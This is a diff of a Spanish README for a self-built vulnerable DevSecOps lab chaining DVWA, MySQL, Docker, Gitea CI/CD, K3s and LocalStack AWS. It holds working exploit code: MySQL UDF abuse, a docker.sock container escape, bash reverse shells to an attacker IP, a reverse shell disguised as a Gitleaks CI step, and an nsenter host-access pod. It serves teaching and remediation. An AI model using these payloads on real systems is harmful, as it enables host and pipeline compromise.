@@ -1,10 +1,12 @@
 # DevSecOps Vulnerable Lab — Cadena de explotación end-to-end (y su remediación)
 
-> Laboratorio personal DEV-SEC-OPS que abarca desde la capa cloud en AWS, pasando por Kubernetes, el repositorio de código fuente (Gitea), la pipeline y la aplicación web vulnerable (DVWA) conectada a la base de datos (MySQL). Son seis capas intencionadamente vulnerables con fines demostrativos.
+> Laboratorio personal de DEV-SEC-OPS. Simula una infraestructura de DevOps con seis capas configuradas con fallos a propósito, infra cloud en AWS (emulada en local con LocalStack), host con Docker, clúster Kubernetes (K3s), repo + CI/CD en Gitea, y las aplicaciones DVWA y MySQL.
 
-> El objetivo es documentar cómo varias configuraciones inseguras, cada una sin aparente impacto por separado, se combinan para comprometer toda la jerarquía: desde una subida de fichero en una aplicación web hasta el acceso a la cuenta cloud, junto a la versión corregida de cada configuración vulnerable.
+> La idea del lab es que casi ningún fallo es crítico por separado pero sí en conjunto. Un rol IAM abierto no hace nada mientras nadie llegue a él, y un `docker.sock` a `0777` tampoco mientras ningún contenedor lo monte... (aunque quizá una subred VPC abierta a internet sí 😂😂). Lo que hace daño no son los fallos sueltos sino cómo se encadenan, empiezas subiendo un fichero malicioso en DVWA y acabas con control total de la cuenta de AWS. De cada config vulnerable dejo también su versión corregida.
 
-> Aisladas, la mayoría de estas malas configuraciones pasaría una revisión sin incidencias. El riesgo aparece cuando las capas tienen conexión entre sí: un rol IAM demasiado abierto no tiene efecto hasta que algo puede alcanzarlo; un `docker.sock` con permisos laxos es inofensivo hasta que un contenedor lo monta.
+> Un apunte para no liarse, la infra se levanta de abajo arriba (cloud → host → K8s → apps), pero la explotación recorre esas mismas piezas al revés, empezando por la web y terminando en el cloud, en 6 capas:
+>
+> `DVWA (1) → MySQL (2) → Host (3) → CI/CD (4) → K8s (5) → IaC/Cloud (6)`
 
 ![Status](https://img.shields.io/badge/status-active-brightgreen)
 ![License](https://img.shields.io/badge/license-MIT-blue)
@@ -25,21 +27,34 @@
 
 ---
 
-**Stack:** AWS (Simulación local mediante) LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL
+**Stack:** AWS (emulado en local con LocalStack) · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL
 
 ---
 
-## Arquitectura
+## Decisiones de diseño
+
+Por qué el lab está montado como está, que muchas de estas cosas salieron de pelearme horas con ellas y acabé decidiendo un poco por descarte
+
+Uso **LocalStack en vez de AWS de verdad** por lo obvio, coste cero y sin miedo a romper una cuenta de pago real. Aunque el precio a pagar es que LocalStack no aplica IAM por defecto (lo explico en la Capa 6), así que el contraste vulnerable/hardened en cloud valida el código y no la ejecución. Llegué a valorar meter LocalStack como un pod más dentro de K3s, pero lo descarté porque rompía la jerarquía real de cloud → clúster y encima complicaba el propio LocalStack, prefería que la parte "cloud" viviera por fuera.
+
+Corro **K3s sobre Docker** (`--docker`) en lugar de su containerd embebido, y esto no fue capricho. Con Docker y el containerd de K3s a la vez la CPU se iba al 100% porque los dos peleaban por los mismos cgroups, y sobre todo, el runner de CI/CD necesita hablar directamente con el socket de Docker del host, así que tiene sentido que haya un único motor de contenedores. De paso desactivé el `metrics-server`, que en local no aporta y consume.
+
+Empecé con **GitLab CE y lo cambié por Gitea + Act-Runner** porque GitLab se comía tranquilamente entre 4 y 8 GB de RAM en reposo, una barbaridad para un lab que va en una VM. Por la misma razón, para el registro de contenedores descarté Harbor (que son Core, Portal, Postgres, Redis, Trivy embebido y certificados TLS quisquillosos) y tiré del **registro nativo de Gitea**, que ya estaba levantado.
+
+El resto son decisiones de simplicidad. Va **todo en un nodo y en la misma red NAT** (`192.168.252.0/24` de VirtualBox), que en producción K3s, LocalStack, Gitea y las apps no comparten ni host ni red plana, pero aquí me interesaba poder desplegarlo entero en dos VMs. Uso **K3s y no Kubernetes completo** por peso, arranca en segundos y usa Kine sobre SQLite en vez de etcd, que es justo lo que habilita el hallazgo de `state.db` de la Capa 5. Y el **modelo de amenaza** arranca con el atacante ya dentro de DVWA, no modelo cómo llega ahí (phishing, escaneo, lo que sea) porque lo interesante no es el acceso inicial sino el pivote y la escalada una vez tienes el initial foothold.
+
+---
+
+## Estructura
 
 <details>
-<summary><strong>Mapa, estructura del repositorio y tabla de controles rotos</strong></summary>
+<summary><strong>Mapa, estructura del repositorio y tabla de "Broken Access Control"</strong></summary>
 
 ### Mapa de infraestructura
 
-Una VPC con una única subnet pública, una instancia EC2 expuesta directamente a internet, un Security Group sin restricción de origen, un bucket S3 sin bloqueo de acceso público y roles IAM sobreprivilegiados. 
-A nivel de host, el firewall está desactivado y `docker.sock` tiene permisos de escritura para cualquier usuario. En Kubernetes, el runner de CI/CD se ejecuta con `privileged: true` y el socket de Docker del host montado dentro del pod.
+Una VPC con una sola subred pública, una EC2 dentro de ella, un Security-Group que no filtra por origen, un bucket S3 sin bloqueo de acceso público y los roles IAM con más permisos de la cuenta. En el host, el firewall está apagado (`systemctl stop ufw`) y el `docker.sock` tiene permisos de escritura para todos (`0777`). A nivel de clúster, el runner de CI/CD (el que ejecuta la pipeline de Gitea) corre con `privileged: true` y monta el `docker.sock` del host dentro del propio pod. El pod de MySQL hace lo mismo, para permitir el escape al host.
 
-Ninguna de estas configuraciones es crítica por sí sola. En conjunto, forman una ruta desde la aplicación pública hasta el acceso a la cuenta cloud.
+> El `docker.sock` montado es la bisagra de toda la cadena, así que lo cuento a fondo una vez en la **Capa 3** y en el resto de sitios va por referencia, para no repetir cuatro veces la misma historia.
 
 ### Estructura del repositorio
 
@@ -69,7 +84,7 @@ Ninguna de estas configuraciones es crítica por sí sola. En conjunto, forman u
 | **Identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` | 🔴 Crítica | Capa 6 |
 | **Identidad (IAM)** | `iam.tf` | Usuario con `AdministratorAccess` directo | 🔴 Crítica | Capa 6 |
 | **Acceso a red** | `network.tf` | SSH (22) abierto a `0.0.0.0/0` | 🟠 Alta | Capa 3 |
-| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🔴 Crítica* | Capa 3 |
+| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🟠 Alta (hallazgo de escáner, no explotado) | — |
 | **Acceso a red** | `network.tf` | Egress sin restricción | 🟠 Alta | Capa 6 |
 | **Exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado | 🟠 Alta | Capa 6 |
 | **Exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
@@ -79,7 +94,7 @@ Ninguna de estas configuraciones es crítica por sí sola. En conjunto, forman u
 | **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
 | **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |
 
-> **\* Nota sobre el puerto 2375.** El Security Group abierto en 2375 no es explotable por sí mismo: requiere que la Docker API escuche efectivamente en ese puerto sin autenticación. En este laboratorio no lo hace por esa vía; la explotación real usa el socket Unix con permisos `0777` de la Capa 3. Se marca como crítico condicional porque amplifica otro hallazgo, no porque sea una vía de entrada independiente. Un escáner automático lo reporta como crítico sin esa distinción; a efectos de priorización, la diferencia es relevante.
+> **Sobre el puerto 2375.** El SG abierto en 2375 no se explota en este lab, haría falta que la API de Docker escuchara ahí sin autenticación y no lo hace, que la entrada real es el socket Unix a `0777` de la Capa 3. Lo dejo como Alta y no como crítico, aunque un escáner automático lo reportaría como crítico a ciegas. Es justo el tipo de hallazgo que un escáner sobrevalora sin saber el contexto.
 
 ### Configuración vulnerable (extracto)
 
@@ -110,41 +125,36 @@ resource "aws_iam_user_policy_attachment" "user_admin_attach" {
 
 ## Explotación de la cadena
 
-> **Aviso legal y ético.** Todo el ejercicio se ejecuta en un entorno aislado (red local + LocalStack), sin conexión a producción ni a terceros, sobre infraestructura propia desplegada con fines educativos. Reproducir estas técnicas contra sistemas sin autorización explícita del propietario es ilegal.
-
-Para seguir la sección conviene manejar SQL, PHP, Bash/Python y manifiestos de Kubernetes a nivel básico, entender contenedores, orquestación e IaC a nivel conceptual, y tener el laboratorio desplegado (ver Despliegue) con conectividad entre Kali (`192.168.252.20`) y el clúster (`192.168.252.10`).
+Conviene manejar lo básico de SQL, PHP, Bash/Python y manifiestos/config-files de Kubernetes por encima, entender contenedores, orquestación e IaC a nivel conceptual, y tener el laboratorio desplegado con conectividad entre el Kali (`192.168.252.20`) y el clúster (`192.168.252.10`). Por facilidad de configuración los metí en la misma red NAT de VirtualBox (`192.168.252.0/24`).
 
 <p align="center">
   <img src="docs/animations/02-progress.gif" alt="Progreso de la cadena, capa a capa" width="720">
   <br><em>Estado de la cadena a medida que se compromete cada capa.</em>
 </p>
 
-<!-- GUION · 02-progress.gif ------------------------------------------------
-     La línea `[✓] DVWA → [✓] MySQL → ...` marcándose sola, un tick por capa,
-     sincronizada con el scroll de las 6 subsecciones. Opcional. ~6 s.
------------------------------------------------------------------------------->
+<!-- 02-progress.gif · opcional: la línea [✓] DVWA → [✓] MySQL → ... marcándose sola. ~6 s -->
 
 <details open>
 <summary><strong>Capa 1 · Acceso inicial — DVWA</strong></summary>
 
-DVWA ofrece tres vectores de entrada directos: SQLi, Command Injection y File Upload/LFI. Se usa la combinación File Upload + LFI porque proporciona ejecución de PHP arbitrario en el servidor, es decir, una shell interactiva. La SQLi se habría limitado a extracción de datos, sin ejecución; para pivotar entre capas, una shell da más margen que una inyección ciega.
+La aplicación web DVWA tiene muchas entradas directas, pero por simplicidad solo se explotan y documentan las que dan acceso inicial sin mayor complicación (el objetivo no es documentar todo el OWASP Top 10 Web, sino el conjunto de una attack-chain a lo largo de la infra): Command Injection, Local File Inclusion (LFI) —usando Log Poisoning con Path Traversal— y File Upload (subiendo la `shell.php`) combinado con LFI. Otros ataques como la SQLi (blind o normal) o el Cross/Server-Side Request Forgery (C/S-SRF) solo exfiltrarían datos o dependerían de que otro usuario interactuara con la web (robo de cookies).
 
-Antes de plantear el pivote se comprueba si el propio contenedor de DVWA permite escalar. No hay ningún vector local aprovechable:
+Antes de pensar en pivotar, se mira si el propio contenedor de DVWA da para escalar o salir del host. No hay nada:
 
 ```bash
 whoami                                   # → www-data
 sudo -l                                  # → sudo: command not found
 getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
 grep Cap /proc/self/status               # → CapEff: 0000000000000000
-ls -la /var/run/docker.sock             # → No such file or directory
+ls -la /var/run/docker.sock              # → No such file or directory
 cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
 ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
 env                                      # → solo variables de Apache, sin credenciales
 ```
 
-El contenedor de DVWA está correctamente aislado. La enumeración se documenta de forma explícita porque confirma que no hay nada aprovechable a nivel local y justifica que el siguiente movimiento sea lateral, hacia otra capa, en lugar de una escalada dentro del contenedor.
+El contenedor de DVWA está bien aislado. Apunto igualmente la enumeración porque justifica el siguiente paso, si en local no hay por dónde escalar toca moverse lateralmente.
 
-El dato que permite continuar no proviene de un escaneo de red (realizado íntegramente en PHP, sin `nmap`), sino de un fichero de configuración de la aplicación:
+Todo el reconocimiento va en PHP, sin `nmap`. Las credenciales de MySQL están en claro en el config de DVWA:
 
 ```bash
 cat /var/www/html/config/config.inc.php
@@ -159,6 +169,8 @@ php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW G
 // → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
 ```
 
+Un par de cosas del entorno que conviene tener claras antes de tocar nada. DVWA lleva la dificultad por cookie (`security=low`), y si la subes a Medium o High cambian los filtros y varios de estos vectores ya no salen tal cual. Si en el `php.ini` están capadas `system`/`exec`/`passthru` con `disable_functions`, todo el reconocimiento por `php -r` hay que reescribirlo con lo que quede. Y el Log Poisoning depende de dar con la ruta real del access log de Apache (lo típico, `/var/log/apache2/access.log`) e inyectar el payload por el User-Agent antes de incluir el log con el LFI.
+
 #### Ficha de riesgo — DVWA
 
 | Táctica | Técnica | ID | Mitigación |
@@ -168,14 +180,12 @@ php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW G
 | Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
 | Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |
 
-> **Nota.** El acceso inicial se obtiene a través de la aplicación web, pero el dato que permite continuar es la contraseña de la base de datos almacenada en texto plano en `config.inc.php`. Los secretos en ficheros de configuración son un vector de credential access habitual, independiente de la calidad del código de la aplicación.
-
 </details>
 
 <details>
 <summary><strong>Capa 2 · Pivote a MySQL — UDF Abuse</strong></summary>
 
-El pod de **MySQL** está configurado con `privileged: true`, la capability `SYS_ADMIN` y el socket de Docker del host montado dentro del contenedor. El montaje del socket se utiliza en la Capa 3; en esta capa el objetivo es obtener ejecución de comandos dentro del contenedor de MySQL.
+El pod de **MySQL** corre con `privileged: true`, `SYS_ADMIN` y el `docker.sock` del host montado dentro. El montaje es para la Capa 3, aquí solo busco ejecución de comandos en el contenedor.
 
 ```yaml
 # mysql-deployment (vulnerable)
@@ -189,7 +199,17 @@ volumes:
     name: docker-sock
 ```
 
-**UDF Abuse.** La técnica requiere el privilegio `FILE`, conocer la ruta exacta del `plugin_dir` y disponer de una librería `.so` compatible con la arquitectura. Los tres pasos se lanzan desde la shell de DVWA como `www-data`:
+**UDF Abuse.** No hay bug de MySQL de por medio, entro con las credenciales de la Capa 1 y abuso de la carga de funciones definidas por el usuario. Antes de nada hay tres cosas que mirar sí o sí, porque si alguna no está como toca el vector no va:
+
+```sql
+SELECT @@secure_file_priv;   -- debe estar VACÍO ('') para que INTO DUMPFILE escriba fuera de su carpeta
+SELECT @@plugin_dir;         -- ruta real del plugin_dir, NO la asumas
+SHOW GRANTS;                 -- necesito el privilegio FILE
+```
+
+La primera y la que más rabia da es `secure_file_priv`, que en mysql:5.7 el valor por defecto suele ser `/var/lib/mysql-files/` o `NULL` y con cualquiera de los dos el `INTO DUMPFILE` fuera de esa carpeta falla, o sea que esto solo tira si está vacío, no es algo que "simplemente sale". La segunda es el `plugin_dir`, yo escribo a `/usr/lib64/mysql/plugin/` que es convención de RHEL, pero la imagen oficial de Debian lo tiene en `/usr/lib/mysql/plugin/`, así que mejor no asumirlo y sacar la ruta del `SELECT @@plugin_dir`. Y la tercera, la `.so` de Metasploit tiene que casar en arquitectura y glibc con el contenedor o el `CREATE FUNCTION` peta al cargar el símbolo.
+
+Desde la shell de DVWA como `www-data`, con eso comprobado:
 
 ```php
 // 1 — Subir la librería UDF a una tabla auxiliar (hex)
@@ -198,8 +218,8 @@ $c   = new mysqli("mysql-service","app","vulnerables","dvwa");
 $c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB)");
 $c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");
 
-// 2 — Volcar la .so al plugin_dir
-$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib64/mysql/plugin/udf_sys.so'");
+// 2 — Volcar la .so al plugin_dir REAL (el que devolvió SELECT @@plugin_dir)
+$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so'");
 
 // 3 — Registrar sys_eval y confirmar la ejecución de comandos
 $c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
@@ -207,25 +227,18 @@ $r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
 // → uid=999(mysql) gid=999(mysql)
 ```
 
-En este punto se dispone de ejecución de comandos dentro del contenedor de MySQL, con el usuario `mysql` (uid 999). El escape al host se desarrolla en la Capa 3.
+Ya ejecuto comandos en el contenedor de MySQL como uid 999. El escape al host va en la Capa 3.
 
-#### Ficha de riesgo — MySQL
-
-| Táctica | Técnica | ID | Mitigación |
-|---|---|---|---|
-| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir el privilegio `FILE`; `secure_file_priv` acotado |
-| Credential Access | Credentials in Files | T1552.001 | Credenciales de BD fuera de ficheros de aplicación |
-
-> **Nota.** El acceso a MySQL usa las credenciales obtenidas en la Capa 1, no una vulnerabilidad de la base de datos. El privilegio `FILE`, junto con un `plugin_dir` escribible, es suficiente para cargar una UDF y ejecutar comandos del sistema.
+MITRE aquí es T1203 (UDF abuse), y la mitigación es restringir el privilegio `FILE` y acotar `secure_file_priv`. La ficha completa la dejo en las capas donde el vector es menos evidente.
 
 </details>
 
 <details>
 <summary><strong>Capa 3 · Escape al host vía docker.sock</strong></summary>
 
-El pod de MySQL tiene montado `/var/run/docker.sock` (ver el manifiesto de la Capa 2). Con ejecución de comandos como `mysql`, ese socket permite crear contenedores en el daemon de Docker del host y, con ellos, salir del contenedor. Es la parte técnicamente más delicada de la cadena.
+El pod de MySQL tiene dentro el `/var/run/docker.sock` (montaje declarado en el manifiesto de la Capa 2). Con ejecución como `mysql` y ese socket, puedo crear contenedores en el daemon del host y salir por ahí. Es la parte más "fina" de toda la cadena.
 
-La imagen de MySQL no incluye la CLI de Docker ni `curl`, por lo que las peticiones al Docker Engine API se construyen a mano sobre el socket Unix, usando el módulo `socket` de Python.
+La imagen de MySQL va bastante pelada, de red y de montaje no tiene nada, ni la CLI de Docker, ni `curl`, ni `netcat`, ni `mount`/`chroot`/`nsenter`, lo único que trae es un intérprete de Python, así que las peticiones a la API de Docker Engine las hago a mano sobre el socket Unix con el módulo `socket`.
 
 <p align="center">
   <img src="docs/animations/03-docker-escape.gif" alt="Escape de contenedor a root en el host vía docker.sock" width="820">
@@ -245,24 +258,40 @@ cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>
 payload = json.dumps({
     "Image": "alpine:latest",
     "Cmd": ["/bin/sh","-c","echo "+base64.b64encode(cmd.encode()).decode()+" | base64 -d | sh"],
-    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host", "Privileged": True}
+    # Lo imprescindible es Binds (montar el host) + NetworkMode host (que salga la reverse shell).
+    # Privileged NO hace falta para este escape, con el bind de / y el chroot ya sales.
+    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host"}
 })
-s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect("/var/run/docker.sock")
-s.sendall(("POST /containers/create?name=escape1 HTTP/1.1\r\nHost: localhost\r\n"
-           "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s" % (len(payload), payload)).encode())
-s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s2.connect("/var/run/docker.sock")
-s2.sendall(b"POST /containers/escape1/start HTTP/1.1\r\nHost: localhost\r\n\r\n")
+
+def call(path, body=None):
+    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+    s.connect("/var/run/docker.sock")
+    if body is None:
+        req = "POST %s HTTP/1.1\r\nHost: localhost\r\n\r\n" % path
+    else:
+        req = ("POST %s HTTP/1.1\r\nHost: localhost\r\n"
+               "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
+               % (path, len(body), body))
+    s.sendall(req.encode())
+    resp = s.recv(4096)          # leer la respuesta, si no no sabes si el create/start ha fallado
+    s.close()
+    return resp
+
+# Fijo la versión de API en la URL (que case con `docker version` del daemon)
+print(call("/v1.41/containers/create?name=escape1", payload))   # esperado: 201 Created
+print(call("/v1.41/containers/escape1/start"))                  # esperado: 204 No Content
 ```
 
-Varios campos del payload resuelven fallos que no producen ningún mensaje de error, solo la ausencia del resultado esperado:
+Varios campos del payload salieron de pelear con fallos que no daban error visible pero se quedaban sin hacer nada, y no recibía la reverse-shell en el Kali:
 
-- **`alpine` en lugar de `mysql:5.7`.** La imagen de MySQL es mínima y no incluye `mount`, `chroot` ni `nsenter`; Alpine sí. Se puede comprobar qué binarios trae una imagen arrancando un contenedor efímero con `which mount chroot nsenter` como comando y leyendo sus logs.
-- **`NetworkMode: host`.** Sin este parámetro, el contenedor efímero queda en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, sin alcanzar el destino y sin producir error. Con `host`, el contenedor comparte la pila de red del nodo, sin NAT, y la conexión saliente funciona.
-- **`Binds: ["/:/mnt/host"]` en lugar de `mount --bind`.** El daemon resuelve `Binds` antes de arrancar el contenedor; hacerlo manualmente dentro del comando genera conflictos de punto de montaje y requiere `mount` en la imagen.
-- **Base64.** Evita el quoting anidado entre PHP, el JSON y la shell del contenedor, que rompía el script de forma inconsistente.
-- **Sin f-strings.** El contenedor de MySQL ejecuta Python 2; la concatenación de cadenas se hace con `+`.
+- **`alpine` en vez de `mysql:5.7`.** La imagen de MySQL no lleva `mount`, `chroot` ni `nsenter`, pero Alpine sí. Para ver qué trae una imagen, arranco el contenedor efímero con `which mount chroot nsenter` y leo los logs a ver si se queja.
+- **`NetworkMode: host`.** Sin esto el contenedor efímero se queda en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, se pierde y no avisa. Con `host` comparte la red del nodo, sin NAT, y la conexión sale.
+- **`Binds: ["/:/mnt/host"]` en vez de `mount --bind`.** El daemon resuelve `Binds` antes de arrancar el contenedor. Montar a mano dentro del comando choca con los puntos de montaje y encima pide tener `mount` en la imagen.
+- **Base64.** Me evita el quoting anidado entre PHP, el JSON y la shell del contenedor, que rompía el script.
+- **Sin f-strings.** El Python del contenedor de MySQL es 2, así que concateno los strings con `+`.
+- **Leer la respuesta del socket.** Lo añadí después de perder tiempo, que el `create`/`start` puede fallar en silencio y leyendo el `201`/`204` (o el error) sabes al momento si tiró o no.
 
-Cuando la conexión llega al `nc -lvnp 5555`, la shell es root en el host, no en un contenedor: el `chroot` al filesystem del host montado hace que el entorno sea el del anfitrión.
+Cuando la conexión entra en el `nc -lvnp 5555`, la shell es root en el host. El `chroot` al filesystem montado te deja directamente en el anfitrión.
 
 #### Ficha de riesgo — Escape al host
 
@@ -272,14 +301,14 @@ Cuando la conexión llega al `nc -lvnp 5555`, la shell es root en el host, no en
 | Privilege Escalation | Abuse Elevation Control: Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` mediante PSA / OPA |
 | Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |
 
-> **Nota.** Un contenedor de base de datos no requiere acceso al daemon de Docker. Montar `/var/run/docker.sock` dentro del pod equivale a conceder control del host, con independencia del resto de restricciones del contenedor. El montaje procedía de una configuración para builds locales y no se retiró al desplegar en el clúster; en los manifiestos el contenedor sigue pareciendo aislado.
+Un contenedor de base de datos (y ninguno, salvo casos muy muy especiales) no tiene por qué tocar el daemon de Docker bajo ningún concepto. Aquí se simula que lo tiene porque venía de "una config de builds en local que nadie quitó al desplegar" o cualquier otra historia. Por lo demás, a nivel de manifiestos el pod está aislado.
 
 </details>
 
 <details>
 <summary><strong>Capa 4 · CI/CD — Gitea / Act-Runner</strong></summary>
 
-Con root en el host, los datos de Gitea (persistidos mediante `hostPath`) son legibles directamente:
+Con root en el host, los datos de Gitea (van en un `hostPath`) se leen directamente:
 
 ```bash
 cat /var/lib/gitea-data/app.ini
@@ -288,9 +317,9 @@ cat /var/lib/gitea-data/app.ini
 # [oauth2]   JWT_SECRET = eyJhbGci...
 ```
 
-`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en texto plano es posible forjar sesiones o tokens válidos sin credenciales de usuario. Además, el manifiesto del runner expone su token de registro en el comando de arranque.
+`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en claro puedo falsificar sesiones o tokens sin tener usuario. El manifiesto del runner además deja su token de registro a la vista en el comando de arranque.
 
-**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (con `docker.sock` del host y `privileged: true`), por lo que basta con introducir una línea en un workflow. El paso se presenta como una tarea habitual:
+**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (`docker.sock` del host, `privileged: true`), así que con una línea en un workflow basta. Va disfrazado de paso normal:
 
 ```yaml
 - name: Gitleaks Scan
@@ -300,7 +329,15 @@ cat /var/lib/gitea-data/app.ini
     gitleaks detect --source="."   # → decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
 ```
 
-La combinación de `base64` y `continue-on-error` tiene un efecto concreto: en una revisión de PR superficial el paso aparece como un escaneo de secretos, el pipeline se reporta correctamente y la reverse shell arranca en segundo plano.
+El `base64` con `continue-on-error` hace que en una revisión rápida de PR el paso pase por un escaneo de secretos, el pipeline salga en verde y la reverse shell arranque aparte.
+
+**De lo que más me peleé fue de esta capa**, así que dejo aquí lo que me rompió por si le sirve a alguien.
+
+El registro del runner fue lo peor con diferencia. Estuve un buen rato regenerando el token y reaplicando el `Secret` de Kubernetes una y otra vez, probé generarlo por CLI, probé el token de repositorio en vez del de instancia y lo único que saqué fue un error distinto (`unimplemented: 404 Not Found`) porque el daemon hace ping contra la raíz de la instancia y yo le estaba pasando la URL del repo. Al final resultó que el `act_runner register` estaba hardcodeado dentro del `command` del Deployment con un token viejo, así que daba igual lo que tocara en el `Secret`, el Deployment ni lo miraba... Lo arreglé generando un token de instancia nuevo y editando el Deployment a mano con `kubectl edit` (con `patch` no, porque se me colaban caracteres invisibles copiados del chat y rompían el JSON), luego borré el `.runner` de antes y reinicié el pod. Lo suyo sería inyectar el token con `secretKeyRef` para que el `Secret` mande de verdad, pero eso lo dejé pendiente.
+
+El otro clásico fue el DNS. El checkout fallaba siempre con `Could not resolve host: gitea-service.gitea.svc.cluster.local` y me tiré un rato dando palos de ciego, montando el `resolv.conf` del host, metiendo `extra_hosts` apuntando al ClusterIP, luego al puerto 3000 de la IP del host... nada. La razón es que los jobs del runner corren como contenedores del Docker del host, fuera de la red de pods de K3s, así que un nombre `*.svc.cluster.local` no lo van a resolver nunca. Y aunque lo resolvieran, Gitea es NodePort, el 3000 solo vale dentro del clúster y de fuera solo responde el 30000. La solución fue registrar el runner contra la URL NodePort del host (`http://192.168.252.10:30000`) y olvidarme del DNS interno.
+
+Un par más rápidos. El `Duplicate mount point: /var/run/docker.sock` era que el socket se montaba dos veces, una en el `volumeMounts` del Deployment y otra dentro del `config.yaml` del propio runner, quité el duplicado y arreglado. Y las Actions oficiales de Trivy y Gitleaks (`aquasecurity/trivy-action`, `gitleaks/gitleaks-action`) no tiran en un Gitea autoalojado, por dentro llaman a `api.github.com` o clonan de GitHub, así que las acabé ejecutando como contenedor directo con `docker run` en el `run:`, que además es justo lo que aprovecha el PPE de arriba. Detalle tonto que me costó otro rato, el `run:` hay que escribirlo en una sola línea, con los `\` de continuación el runner interpretaba mal los saltos.
 
 #### Ficha de riesgo — CI/CD
 
@@ -311,14 +348,14 @@ La combinación de `base64` y `continue-on-error` tiene un efecto concreto: en u
 | Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
 | Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |
 
-> **Nota.** El runner dispone por diseño de las credenciales de despliegue: `kubeconfig`, credenciales cloud y claves de firma. Comprometerlo no requiere ninguna técnica de escalada nueva: hereda los privilegios que el proceso de despliegue ya tiene. El nivel de acceso del CI/CD equivale al de la infraestructura que gestiona y debería tratarse como un componente de producción en el modelo de amenazas.
+Aquí no escalo nada. El runner ya lleva lo que necesita para desplegar (`kubeconfig`, credenciales cloud, claves de firma), y comprometerlo hereda todo eso.
 
 </details>
 
 <details>
 <summary><strong>Capa 5 · Kubernetes (K3s)</strong></summary>
 
-Hay dos formas de llegar al clúster; en un entorno real rara vez se dispone de las dos a la vez. La primera: el `kubeconfig` de `cluster-admin` es legible desde el host (`/etc/rancher/k3s/k3s.yaml`) tras el escape de la Capa 3. La segunda: el Act-Runner suele llevar credenciales de despliegue equivalentes inyectadas como secreto.
+Se llega al clúster de dos maneras, y en real rara vez tienes las dos. Con el escape de la Capa 3, el `kubeconfig` de `cluster-admin` se lee del host en `/etc/rancher/k3s/k3s.yaml`. Aparte, el Act-Runner suele llevar credenciales de despliegue equivalentes como secreto.
 
 **Pod con acceso al PID 1 del host:**
 
@@ -333,7 +370,7 @@ spec:
   containers:
   - name: c
     image: alpine:latest
-    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]
+    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]   # los flags -u/-i no siempre hacen falta, pero no molestan
     securityContext: { privileged: true }
     volumeMounts: [{ mountPath: /host, name: host-root }]
   volumes: [{ name: host-root, hostPath: { path: / } }]
@@ -344,15 +381,13 @@ spec:
   <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del proceso init equivale a una sesión root en el nodo.</em>
 </p>
 
-<!-- GUION · 04-nsenter.gif -------------------------------------------------
-     El pod `node-access-pod` aplicándose; flecha desde el contenedor al proceso
-     PID 1 del host; el prompt se convierte en root del nodo. ~10 s.
------------------------------------------------------------------------------->
+<!-- 04-nsenter.gif · el pod node-access-pod aplicándose y el prompt volviéndose root del nodo -->
 
-Un segundo hallazgo es `state.db`. K3s no usa `etcd` por defecto, sino Kine sobre SQLite, en disco. Los Secrets están ahí en base64 y sin cifrado en reposo, salvo que se haya activado `--secrets-encryption`, que no está habilitado por defecto.
